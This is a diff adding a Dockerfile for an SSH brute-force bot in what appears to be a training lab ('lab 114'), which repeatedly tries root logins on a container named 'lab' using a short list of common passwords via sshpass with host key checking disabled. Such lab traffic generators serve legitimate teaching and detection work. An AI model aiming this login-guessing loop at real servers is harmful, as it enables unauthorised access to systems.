@@ -1,0 +1,4 @@
+# Bot de fuerza bruta SSH del lab 114 (sólo ataca al contenedor 'lab').
+FROM alpine:3.20
+RUN apk add --no-cache openssh-client sshpass
+CMD ["sh", "-c", "sleep 20; while :; do for p in 123456 root toor admin password qwerty; do sshpass -p $p ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o PreferredAuthentications=password root@lab true >/dev/null 2>&1; sleep 4; done; done"]
